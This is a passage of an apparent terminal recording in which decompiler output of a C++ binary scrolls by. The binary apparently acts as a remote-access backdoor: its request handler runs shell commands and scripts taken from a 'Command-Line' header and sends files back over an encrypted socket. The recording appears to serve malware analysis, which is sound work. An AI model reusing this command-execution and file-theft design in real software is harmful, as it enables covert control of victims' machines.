[106.057489, "o", "eply_7;\\\\\\\\n  FileOpration fileopration__4;\\\\\\\\n  string filepath_2;\\\\\\\\n  Value reply_6;\\\\\\\\n  FileOpration fileopration__3;\\\\\\\\n  string filepath_1;\\\\\\\\n  Value reply_5;\\\\\\\\n  FileOpration fileopration__2;\\\\\\\\n  Value reply_4;\\\\\\\\n  FileOpration fileopration__1;\\\\\\\\n  uint32_t len_1;\\\\\\\\n  string data_1;\\\\\\\\n  uint32_t len;\\\\\\\\n  string data;\\\\\\\\n  Value reply_3;\\\\\\\\n  FileOpration fileopration_;\\\\\\\\n  string res_handle_1;\\\\\\\\n  string filepath;\\\\\\\\n  Value reply_2;\\\\\\\\n  Command command__1;\\\\\\\\n  string cmd_1;\\\\\\\\n  string res_handle;\\\\\\\\n  Value reply_1;\\\\\\\\n  Command command_;\\\\\\\\n  string cmd;\\\\\\\\n  pthread_t thread;\\\\\\\\n  Value reply;\\\\\\\\n  string type;\\\\\\\\n  Value local_668;\\\\\\\\n  Value local_648;\\\\\\\\n  Value local_628;\\\\\\\\n  Value local_608;\\\\\\\\n  Value local_5e8;\\\\\\\\n  undefined local_5c8 [48];\\\\\\\\n  Value local_598;\\\\\\\\n  Value local_578;\\\\\\\\n  Value local_558;\\\\\\\\n  allocator<char> local_539;\\\\\\\\n  undefined local_538 [48];\\\\\\\\n  Value local_508;\\\\\\\\n  Value local_4e8;\\\\\\\\n  Value local_4c8;\\\\\\\\n "]
[106.057617, "o", " allocator<char> local_4aa;\\\\\\\\n  allocator<char> local_4a9;\\\\\\\\n  Value local_4a8;\\\\\\\\n  Value local_488;\\\\\\\\n  Value local_468;\\\\\\\\n  Value local_448;\\\\\\\\n  allocator<char> local_429;\\\\\\\\n  Value local_428;\\\\\\\\n  Value local_408;\\\\\\\\n  Value local_3e8;\\\\\\\\n  Value local_3c8;\\\\\\\\n  Value local_3a8;\\\\\\\\n  Value local_388;\\\\\\\\n  Value local_368;\\\\\\\\n  Value local_348;\\\\\\\\n  Value local_328;\\\\\\\\n  Value local_308;\\\\\\\\n  Value local_2e8;\\\\\\\\n  Value local_2c8;\\\\\\\\n  Value local_2a8;\\\\\\\\n  Param local_288;\\\\\\\\n  Value local_268;\\\\\\\\n  Value local_248;\\\\\\\\n  Value local_228;\\\\\\\\n  Value local_208;\\\\\\\\n  undefined local_1e8 [16];\\\\\\\\n  basic_string local_1d8 [4];\\\\\\\\n  Value local_1c8;\\\\\\\\n  Value local_1a8;\\\\\\\\n  Value local_188;\\\\\\\\n  undefined local_168 [16];\\\\\\\\n  basic_string local_158 [4];\\\\\\\\n  Value local_148;\\\\\\\\n  Value local_128;\\\\\\\\n  Value local_108;\\\\\\\\n  Value local_e8;\\\\\\\\n  Value local_c8;\\\\\\\\n  Value local_a8;\\\\\\\\n  Value local_88;\\\\\\\\n  Worker *worker;\\\\\\\\n  int ret;\\\\\\\\n  int ret_1;\\\\\\\\n  int re"]
[106.057759, "o", "t_2;\\\\\\\\n  int ret_3;\\\\\\\\n  ushort rev_port;\\\\\\\\n  ushort des_port;\\\\\\\\n  int maxfd;\\\\\\\\n  int nevents;\\\\\\\\n  uint __i;\\\\\\\\n  anon_struct_conflict4 *__arr;\\\\\\\\n  uint __i_1;\\\\\\\\n  anon_struct_conflict4 *__arr_1;\\\\\\\\n  int i;\\\\\\\\n  int n;\\\\\\\\n  int n_1;\\\\\\\\n  \\\\\\\\n  Param::SetWriteCipher(&this->param_,this->write_cipher);\\\\\\\\n  Json::Value::operator[](request,\\\\\\\\\\\\\\\"uri\\\\\\\\\\\\\\\");\\\\\\\\n  Json::Value::asString((Value *)&type);\\\\\\\\n                    /* try { // try from 0041a97d to 0041a99a has its CatchHandler @ 0041d2fa */\\\\\\\\n  bVar4 = std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"connection\\\\\\\\\\\\\\\");\\\\\\\\n  if (bVar4) {\\\\\\\\n    Json::Value::Value(&reply,nullValue);\\\\\\\\n                    /* try { // try from 0041a9a7 to 0041a9ab has its CatchHandler @ 0041acd0 */\\\\\\\\n    Json::Value::Value(&local_668,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041a9b8 to 0041a9cb has its CatchHandler @ 0041a9da */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[]"]
[106.057862, "o", "(&reply,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n    Json::Value::operator=(pVVar10,&local_668);\\\\\\\\n                    /* try { // try from 0041a9d3 to 0041a9d7 has its CatchHandler @ 0041acd0 */\\\\\\\\n    Json::Value::~Value(&local_668);\\\\\\\\n                    /* try { // try from 0041aa05 to 0041aa09 has its CatchHandler @ 0041acd0 */\\\\\\\\n    this_00 = (Worker *)operator_new(0x60);\\\\\\\\n                    /* try { // try from 0041aa28 to 0041aa2c has its CatchHandler @ 0041aa52 */\\\\\\\\n    Worker(this_00,false,this->options_);\\\\\\\\n    worker = this_00;\\\\\\\\n                    /* try { // try from 0041aa44 to 0041ab13 has its CatchHandler @ 0041acd0 */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Child-ID\\\\\\\\\\\\\\\");\\\\\\\\n    iVar7 = Json::Value::asInt(pVVar10);\\\\\\\\n    worker->child_id_ = iVar7;\\\\\\\\n    pthread_attr_init((pthread_attr_t *)&attr);\\\\\\\\n    pthread_attr_setdetachstate((pthread_attr_t *)&attr,1);\\\\\\\\n  "]
[106.058712, "o", "  iVar7 = pthread_create(&thread,(pthread_attr_t *)&attr,WorkerThread,worker);\\\\\\\\n    if (iVar7 == 0) {\\\\\\\\n                    /* try { // try from 0041abdc to 0041abe0 has its CatchHandler @ 0041acd0 */\\\\\\\\n      Json::Value::Value(&local_608,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041abed to 0041ac00 has its CatchHandler @ 0041ac0f */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_608);\\\\\\\\n                    /* try { // try from 0041ac08 to 0041ac0c has its CatchHandler @ 0041acd0 */\\\\\\\\n      Json::Value::~Value(&local_608);\\\\\\\\n                    /* try { // try from 0041ac41 to 0041ac45 has its CatchHandler @ 0041acd0 */\\\\\\\\n      Json::Value::Value(&local_5e8,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041ac52 to 0041ac65 has its CatchHandler @ 0041ac74 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::ope"]
[106.058939, "o", "rator=(pVVar10,&local_5e8);\\\\\\\\n                    /* try { // try from 0041ac6d to 0041ac71 has its CatchHandler @ 0041acd0 */\\\\\\\\n      Json::Value::~Value(&local_5e8);\\\\\\\\n    }\\\\\\\\n    else {\\\\\\\\n      if (worker != (Worker *)0x0) {\\\\\\\\n        (*worker->_vptr_Worker[1])(worker);\\\\\\\\n      }\\\\\\\\n      worker = (Worker *)0x0;\\\\\\\\n      Json::Value::Value(&local_648,\\\\\\\\\\\\\\\"404\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041ab20 to 0041ab33 has its CatchHandler @ 0041ab42 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_648);\\\\\\\\n                    /* try { // try from 0041ab3b to 0041ab3f has its CatchHandler @ 0041acd0 */\\\\\\\\n      Json::Value::~Value(&local_648);\\\\\\\\n                    /* try { // try from 0041ab74 to 0041ab78 has its CatchHandler @ 0041acd0 */\\\\\\\\n      Json::Value::Value(&local_628,\\\\\\\\\\\\\\\"NOT FOUND\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041ab85 to 0041ab98 has its Cat"]
[106.059046, "o", "chHandler @ 0041abaa */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_628);\\\\\\\\n                    /* try { // try from 0041aba0 to 0041aba4 has its CatchHandler @ 0041acd0 */\\\\\\\\n      Json::Value::~Value(&local_628);\\\\\\\\n    }\\\\\\\\n    pthread_attr_destroy((pthread_attr_t *)&attr);\\\\\\\\n                    /* try { // try from 0041acb1 to 0041acb5 has its CatchHandler @ 0041acd0 */\\\\\\\\n    uStack_10af4 = WriteJson(this,&reply);\\\\\\\\n                    /* try { // try from 0041acc6 to 0041acca has its CatchHandler @ 0041d2fa */\\\\\\\\n    Json::Value::~Value(&reply);\\\\\\\\n    goto LAB_0041d327;\\\\\\\\n  }\\\\\\\\n                    /* try { // try from 0041ad02 to 0041ad1a has its CatchHandler @ 0041d2fa */\\\\\\\\n  bVar4 = std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"command\\\\\\\\\\\\\\\");\\\\\\\\n  if (bVar4) {\\\\\\\\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();\\\\\\\\n "]
[106.059143, "o", "                   /* try { // try from 0041ad27 to 0041ad47 has its CatchHandler @ 0041b14b */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n    Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Command-Line\\\\\\\\\\\\\\\");\\\\\\\\n    Json::Value::asString((Value *)local_5c8);\\\\\\\\n                    /* try { // try from 0041ad56 to 0041ad5a has its CatchHandler @ 0041ad69 */\\\\\\\\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=\\\\\\\\n              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&cmd,\\\\\\\\n               (basic_string *)local_5c8);\\\\\\\\n                    /* try { // try from 0041ad62 to 0041ad66 has its CatchHandler @ 0041b14b */\\\\\\\\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_5c8);\\\\\\\\n    Command::Command(&command_);\\\\\\\\n                    /* try { // try from 0041ada7 to 0041adab has"]
[106.059165, "o", " its CatchHandler @ 0041b14b */\\\\\\\\n    Json::Value::Value(&reply_1,nullValue);\\\\\\\\n                    /* try { // try from 0041adb8 to 0041adbc has its CatchHandler @ 0041b0f9 */\\\\\\\\n    Json::Value::Value((Value *)(local_5c8 + 0x10),\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041adc9 to 0041addc has its CatchHandler @ 0041adeb */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](&reply_1,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n    Json::Value::operator=(pVVar10,(Value *)(local_5c8 + 0x10));\\\\\\\\n                    /* try { // try from 0041ade4 to 0041ade8 has its CatchHandler @ 0041b0f9 */\\\\\\\\n    Json::Value::~Value((Value *)(local_5c8 + 0x10));\\\\\\\\n                    /* try { // try from 0041ae1d to 0041ae21 has its CatchHandler @ 0041b0f9 */\\\\\\\\n    Json::Value::Value(&local_598,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041ae2e to 0041ae41 has its CatchHandler @ 0041ae50 */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](&reply_1,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n"]
[106.059268, "o", "    Json::Value::operator=(pVVar10,&local_598);\\\\\\\\n                    /* try { // try from 0041ae49 to 0041ae4d has its CatchHandler @ 0041b0f9 */\\\\\\\\n    Json::Value::~Value(&local_598);\\\\\\\\n                    /* try { // try from 0041ae82 to 0041ae86 has its CatchHandler @ 0041b0f9 */\\\\\\\\n    Json::Value::Value(&local_578,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041ae93 to 0041aea6 has its CatchHandler @ 0041aeb5 */\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](&reply_1,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n    Json::Value::operator=(pVVar10,&local_578);\\\\\\\\n                    /* try { // try from 0041aeae to 0041aeb2 has its CatchHandler @ 0041b0f9 */\\\\\\\\n    Json::Value::~Value(&local_578);\\\\\\\\n                    /* try { // try from 0041aee7 to 0041aeeb has its CatchHandler @ 0041b0f9 */\\\\\\\\n    Json::Value::Value(&local_558,\\\\\\\\\\\\\\\"chunked\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041aef8 to 0041af18 has its CatchHandler @ 0041af27 */\\\\\\\\n    pVVar10 = (Value *)Jso"]
[106.059373, "o", "n::Value::operator[](&reply_1,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n    pVVar10 = (Value *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Transfer-Encoding\\\\\\\\\\\\\\\");\\\\\\\\n    Json::Value::operator=(pVVar10,&local_558);\\\\\\\\n                    /* try { // try from 0041af20 to 0041af24 has its CatchHandler @ 0041b0f9 */\\\\\\\\n    Json::Value::~Value(&local_558);\\\\\\\\n                    /* try { // try from 0041af5b to 0041afb3 has its CatchHandler @ 0041b0f9 */\\\\\\\\n    bVar4 = WriteJson(this,&reply_1);\\\\\\\\n    if (bVar4) {\\\\\\\\n      pcVar12 = (char *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str\\\\\\\\n                                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *\\\\\\\\n                                   )&cmd);\\\\\\\\n      ret = Command::ExecuteCMD(&command_,pcVar12,&this->param_);\\\\\\\\n      if (ret == 0) {\\\\\\\\n        std::allocator<char>::allocator();\\\\\\\\n                    /* try { // try from 0041afe0 to 0041afe4 has its CatchHandler @ 0041b006 */\\\\\\\\n        std:"]
[106.059456, "o", ":basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string\\\\\\\\n                  ((char *)&res_handle,(allocator *)\\\\\\\\\\\\\\\"CMD Not Found!\\\\\\\\\\\\\\\");\\\\\\\\n        std::allocator<char>::~allocator(&local_539);\\\\\\\\n                    /* try { // try from 0041aff8 to 0041b07e has its CatchHandler @ 0041b096 */\\\\\\\\n        uVar6 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();\\\\\\\\n        pvVar11 = (void *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str\\\\\\\\n                                    ((basic_string<char,std::char_traits<char>,std::allocator<char>>\\\\\\\\n                                      *)&res_handle);\\\\\\\\n        bVar4 = Param::WriteBody(&this->param_,pvVar11,uVar6);\\\\\\\\n        if (bVar4) {\\\\\\\\n          uStack_10af4 = Param::WriteBody(&this->param_,&DAT_0044d171,0);\\\\\\\\n        }\\\\\\\\n        else {\\\\\\\\n          uStack_10af4 = false;\\\\\\\\n        }\\\\\\\\n                    /* try { // try from 0041b0c0 to 0041b0c4 has its Catc"]
[106.059517, "o", "hHandler @ 0041b0f9 */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&res_handle);\\\\\\\\n        bVar4 = false;\\\\\\\\n      }\\\\\\\\n      else if (ret < 1) {\\\\\\\\n        bVar4 = true;\\\\\\\\n      }\\\\\\\\n      else {\\\\\\\\n        uStack_10af4 = 1;\\\\\\\\n        bVar4 = false;\\\\\\\\n      }\\\\\\\\n    }\\\\\\\\n    else {\\\\\\\\n      uStack_10af4 = 0;\\\\\\\\n      bVar4 = false;\\\\\\\\n    }\\\\\\\\n                    /* try { // try from 0041b123 to 0041b127 has its CatchHandler @ 0041b14b */\\\\\\\\n    Json::Value::~Value(&reply_1);\\\\\\\\n                    /* try { // try from 0041b178 to 0041b1b3 has its CatchHandler @ 0041d2fa */\\\\\\\\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n              ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&cmd);\\\\\\\\njoined_r0x0041b6e4:\\\\\\\\n    if (!bVar4) goto LAB_0041d327;\\\\\\\\n  }\\\\\\\\n  else {\\\\\\\\n    bVar4 "]
[106.059539, "o", "= std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"script\\\\\\\\\\\\\\\");\\\\\\\\n    if (bVar4) {\\\\\\\\n      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();\\\\\\\\n                    /* try { // try from 0041b1c0 to 0041b1e0 has its CatchHandler @ 0041b6ab */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Command-Line\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::asString((Value *)local_538);\\\\\\\\n                    /* try { // try from 0041b1ef to 0041b1f3 has its CatchHandler @ 0041b202 */\\\\\\\\n      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=\\\\\\\\n                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&cmd_1,\\\\\\\\n                 (basic_string *)local_538);\\\\\\\\n                    /* try { // try from 0041b1fb to 0041b1ff has its CatchHandler @ 0041b6ab */\\\\\\\\n      std::basic_string<char,std::char_traits<char>,s"]
[106.059687, "o", "td::allocator<char>>::~basic_string\\\\\\\\n                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_538);\\\\\\\\n      Command::Command(&command__1);\\\\\\\\n                    /* try { // try from 0041b240 to 0041b244 has its CatchHandler @ 0041b6ab */\\\\\\\\n      Json::Value::Value(&reply_2,nullValue);\\\\\\\\n                    /* try { // try from 0041b251 to 0041b255 has its CatchHandler @ 0041b659 */\\\\\\\\n      Json::Value::Value((Value *)(local_538 + 0x10),\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041b262 to 0041b275 has its CatchHandler @ 0041b284 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_2,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,(Value *)(local_538 + 0x10));\\\\\\\\n                    /* try { // try from 0041b27d to 0041b281 has its CatchHandler @ 0041b659 */\\\\\\\\n      Json::Value::~Value((Value *)(local_538 + 0x10));\\\\\\\\n                    /* try { // try from 0041b2b6 to 0041b2ba has its CatchHandler @ 0041b65"]
[106.059846, "o", "9 */\\\\\\\\n      Json::Value::Value(&local_508,\\\\\\\\\\\\\\\"200\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041b2c7 to 0041b2da has its CatchHandler @ 0041b2e9 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_2,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_508);\\\\\\\\n                    /* try { // try from 0041b2e2 to 0041b2e6 has its CatchHandler @ 0041b659 */\\\\\\\\n      Json::Value::~Value(&local_508);\\\\\\\\n                    /* try { // try from 0041b31b to 0041b31f has its CatchHandler @ 0041b659 */\\\\\\\\n      Json::Value::Value(&local_4e8,\\\\\\\\\\\\\\\"OK\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041b32c to 0041b33f has its CatchHandler @ 0041b34e */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_2,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_4e8);\\\\\\\\n                    /* try { // try from 0041b347 to 0041b34b has its CatchHandler @ 0041b659 */\\\\\\\\n      Json::Value::~Value(&local_4e8);\\\\\\\\n                    /"]
[106.059916, "o", "* try { // try from 0041b380 to 0041b384 has its CatchHandler @ 0041b659 */\\\\\\\\n      Json::Value::Value(&local_4c8,\\\\\\\\\\\\\\\"chunked\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041b391 to 0041b3b1 has its CatchHandler @ 0041b3c0 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](&reply_2,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"Transfer-Encoding\\\\\\\\\\\\\\\");\\\\\\\\n      Json::Value::operator=(pVVar10,&local_4c8);\\\\\\\\n                    /* try { // try from 0041b3b9 to 0041b3bd has its CatchHandler @ 0041b659 */\\\\\\\\n      Json::Value::~Value(&local_4c8);\\\\\\\\n                    /* try { // try from 0041b3f4 to 0041b432 has its CatchHandler @ 0041b659 */\\\\\\\\n      bVar4 = WriteJson(this,&reply_2);\\\\\\\\n      if (bVar4) {\\\\\\\\n        Command::InputScript((Command *)&filepath,(string *)&command__1);\\\\\\\\n                    /* try { // try from 0041b43f to 0041b4ad has its CatchHandler @ 0041b607 */\\\\\\\\n        bVar4 = std::operator==<char,_std::char"]
[106.05999, "o", "_traits<char>,_std::allocator<char>_>(&filepath,\\\\\\\\\\\\\\\"\\\\\\\\\\\\\\\");\\\\\\\\n        if (bVar4) {\\\\\\\\n          uStack_10af4 = Param::WriteBody(&this->param_,&DAT_0044d171,0);\\\\\\\\n          bVar4 = false;\\\\\\\\n        }\\\\\\\\n        else {\\\\\\\\n          pcVar12 = (char *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::\\\\\\\\n                            c_str((basic_string<char,std::char_traits<char>,std::allocator<char>> *)\\\\\\\\n                                  &filepath);\\\\\\\\n          ret_1 = Command::ExecuteScriptCMD(&command__1,pcVar12,&this->param_);\\\\\\\\n          if (ret_1 == 0) {\\\\\\\\n            std::allocator<char>::allocator();\\\\\\\\n                    /* try { // try from 0041b4da to 0041b4de has its CatchHandler @ 0041b500 */\\\\\\\\n            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string\\\\\\\\n                      ((char *)&res_handle_1,(allocator *)\\\\\\\\\\\\\\\"CMD Not Found!\\\\\\\\\\\\\\\");\\\\\\\\n            std::allocator<char>::~allocator(&local_4aa);\\\\\\\\n        "]
[106.060098, "o", "            /* try { // try from 0041b4f2 to 0041b578 has its CatchHandler @ 0041b590 */\\\\\\\\n            uVar6 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();\\\\\\\\n            pvVar11 = (void *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::\\\\\\\\n                              c_str((basic_string<char,std::char_traits<char>,std::allocator<char>>\\\\\\\\n                                     *)&res_handle_1);\\\\\\\\n            bVar4 = Param::WriteBody(&this->param_,pvVar11,uVar6);\\\\\\\\n            if (bVar4) {\\\\\\\\n              uStack_10af4 = Param::WriteBody(&this->param_,&DAT_0044d171,0);\\\\\\\\n            }\\\\\\\\n            else {\\\\\\\\n              uStack_10af4 = false;\\\\\\\\n            }\\\\\\\\n                    /* try { // try from 0041b5ba to 0041b5dc has its CatchHandler @ 0041b607 */\\\\\\\\n            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                      ((basic_string<char,std::char_traits<char>,std::allocator<"]
[106.060122, "o", "char>> *)\\\\\\\\n                       &res_handle_1);\\\\\\\\n            bVar4 = false;\\\\\\\\n          }\\\\\\\\n          else if (ret_1 < 1) {\\\\\\\\n            bVar4 = true;\\\\\\\\n          }\\\\\\\\n          else {\\\\\\\\n            pcVar12 = (char *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::\\\\\\\\n                              c_str((basic_string<char,std::char_traits<char>,std::allocator<char>>\\\\\\\\n                                     *)&filepath);\\\\\\\\n            remove(pcVar12);\\\\\\\\n            uStack_10af4 = 1;\\\\\\\\n            bVar4 = false;\\\\\\\\n          }\\\\\\\\n        }\\\\\\\\n                    /* try { // try from 0041b631 to 0041b635 has its CatchHandler @ 0041b659 */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                  ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&filepath);\\\\\\\\n        if (bVar4) {\\\\\\\\n          bVar4 = true;\\\\\\\\n        }\\\\\\\\n        else {\\\\\\\\n          bVar4 = false;\\\\\\\\n        }\\\\\\\\n"]
[106.060253, "o", "      }\\\\\\\\n      else {\\\\\\\\n        uStack_10af4 = 0;\\\\\\\\n        bVar4 = false;\\\\\\\\n      }\\\\\\\\n                    /* try { // try from 0041b683 to 0041b687 has its CatchHandler @ 0041b6ab */\\\\\\\\n      Json::Value::~Value(&reply_2);\\\\\\\\n                    /* try { // try from 0041b6d8 to 0041b724 has its CatchHandler @ 0041d2fa */\\\\\\\\n      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string\\\\\\\\n                ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)&cmd_1);\\\\\\\\n      goto joined_r0x0041b6e4;\\\\\\\\n    }\\\\\\\\n    bVar4 = std::operator==<char,_std::char_traits<char>,_std::allocator<char>_>(&type,\\\\\\\\\\\\\\\"download\\\\\\\\\\\\\\\");\\\\\\\\n    if (bVar4) {\\\\\\\\n      FileOpration::FileOpration(&fileopration_);\\\\\\\\n      Json::Value::Value(&reply_3,nullValue);\\\\\\\\n                    /* try { // try from 0041b731 to 0041b759 has its CatchHandler @ 0041c052 */\\\\\\\\n      pVVar10 = (Value *)Json::Value::operator[](request,\\\\\\\\\\\\\\\"headers\\\\\\\\\\\\\\\");\\\\\\\\n      pVVar10 = (V"]
[106.060341, "o", "alue *)Json::Value::operator[](pVVar10,\\\\\\\\\\\\\\\"File-Path\\\\\\\\\\\\\\\");\\\\\\\\n      pcVar12 = (char *)Json::Value::asCString(pVVar10);\\\\\\\\n      ret_2 = FileOpration::handle(&fileopration_,pcVar12);\\\\\\\\n      if (ret_2 == 0) {\\\\\\\\n        std::allocator<char>::allocator();\\\\\\\\n                    /* try { // try from 0041b786 to 0041b78a has its CatchHandler @ 0041b7ac */\\\\\\\\n        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string\\\\\\\\n                  ((char *)&data,(allocator *)\\\\\\\\\\\\\\\"only support file!\\\\\\\\\\\\\\\");\\\\\\\\n        std::allocator<char>::~allocator(&local_4a9);\\\\\\\\n                    /* try { // try from 0041b79e to 0041b868 has its CatchHandler @ 0041ba24 */\\\\\\\\n        uVar8 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::length();\\\\\\\\n        len = htonl(uVar8);\\\\\\\\n        SecureSocket<ClientConnection>::WriteBlock\\\\\\\\n                  (&this->connection_,this->write_cipher,&len,4,60000);\\\\\\\\n        iVar7 = std::basic_string<char,std::char_t"]
[106.060427, "o", "raits<char>,std::allocator<char>>::size();\\\\\\\\n        pvVar11 = (void *)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str\\\\\\\\n                                    ((basic_string<char,std::char_traits<char>,std::allocator<char>>\\\\\\\\n                                      *)&data);\\\\\\\\n        SecureSocket<ClientConnection>::WriteBlock\\\\\\\\n                  (&this->connection_,this->write_cipher,pvVar11,iVar7,60000);\\\\\\\\n        Json::Value::Value(&local_4a8,\\\\\\\\\\\\\\\"1.4\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041b875 to 0041b888 has its CatchHandler @ 0041b897 */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"version\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_4a8);\\\\\\\\n                    /* try { // try from 0041b890 to 0041b894 has its CatchHandler @ 0041ba24 */\\\\\\\\n        Json::Value::~Value(&local_4a8);\\\\\\\\n                    /* try { // try from 0041b8c9 to 0041b8cd has its CatchHandler @ 0041ba24 */\\\\\\\\n        Json::Value"]
[106.06049, "o", "::Value(&local_488,\\\\\\\\\\\\\\\"400\\\\\\\\\\\\\\\");\\\\\\\\n                    /* try { // try from 0041b8da to 0041b8ed has its CatchHandler @ 0041b8fc */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_488);\\\\\\\\n                    /* try { // try from 0041b8f5 to 0041b8f9 has its CatchHandler @ 0041ba24 */\\\\\\\\n        Json::Value::~Value(&local_488);\\\\\\\\n                    /* try { // try from 0041b930 to 0041b934 has its CatchHandler @ 0041ba24 */\\\\\\\\n        Json::Value::Value(&local_468,(basic_string *)&data);\\\\\\\\n                    /* try { // try from 0041b941 to 0041b954 has its CatchHandler @ 0041b963 */\\\\\\\\n        pVVar10 = (Value *)Json::Value::operator[](&reply_3,\\\\\\\\\\\\\\\"text\\\\\\\\\\\\\\\");\\\\\\\\n        Json::Value::operator=(pVVar10,&local_468);\\\\\\\\n                    /* try { // try from 0041b95c to 0041b960 has its CatchHandler @ 0041ba24 */\\\\\\\\n        Json::Value::~Value(&local_468);\\\\\\\\n                    /* try { /"]
